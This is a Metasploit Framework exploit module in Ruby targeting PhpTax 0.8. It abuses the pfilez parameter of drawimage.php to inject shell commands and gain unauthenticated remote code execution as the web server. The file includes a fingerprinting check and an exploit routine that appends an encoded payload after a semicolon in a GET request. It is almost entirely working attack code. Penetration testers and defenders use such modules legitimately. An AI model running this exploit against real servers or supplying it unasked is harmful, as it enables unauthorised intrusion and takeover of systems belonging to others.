# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => "PhpTax pfilez Parameter Exec Remote Code Injection",
      &#039;Description&#039;    => %q{
          This module exploits a vulnerability found in PhpTax, an income tax report
        generator.  When generating a PDF, the icondrawpng() function in drawimage.php
        does not properly handle the pfilez parameter, which will be used in a exec()
        statement, and then results in arbitrary remote code execution under the context
        of the web server.  Please note: authentication is not required to exploit this
        vulnerability.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;Jean Pascal Pereira <pereira[at]secbiz.de>&#039;,
          &#039;sinn3r&#039;  #Metasploit
        ],
      &#039;References&#039;     =>
        [
          [&#039;EDB&#039;, &#039;21665&#039;]
        ],
      &#039;Payload&#039;        =>
        {
          &#039;Compat&#039; =>
          {
            &#039;ConnectionType&#039; => &#039;find&#039;,
            &#039;PayloadType&#039;    => &#039;cmd&#039;,
            &#039;RequiredCmd&#039;    => &#039;generic perl ruby bash telnet python&#039;
          }
        },
      &#039;Platform&#039;       => [&#039;unix&#039;, &#039;linux&#039;],
      &#039;Targets&#039;        =>
        [
          [&#039;PhpTax 0.8&#039;, {}]
        ],
      &#039;Arch&#039;           => ARCH_CMD,
      &#039;Privileged&#039;     => false,
      &#039;DisclosureDate&#039; => "Oct 8 2012",
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, &#039;The path to the web application&#039;, &#039;/phptax/&#039;])
      ], self.class)
  end


  def check
    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;
    res = send_request_raw({&#039;uri&#039;=>target_uri.path})
    if res and res.body =~ /PHPTAX by William L\. Berggren/
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Unknown
    end
  end


  def exploit
    target_uri.path << &#039;/&#039; if target_uri.path[-1,1] != &#039;/&#039;

    print_status("#{rhost}#{rport} - Sending request...")
    res = send_request_cgi({
      &#039;method&#039;   => &#039;GET&#039;,
      &#039;uri&#039;      => "#{target_uri.path}drawimage.php",
      &#039;vars_get&#039; => {
        &#039;pdf&#039;    => &#039;make&#039;,
        &#039;pfilez&#039; => "xxx; #{payload.encoded}"
      }
    })

    handler
  end
end



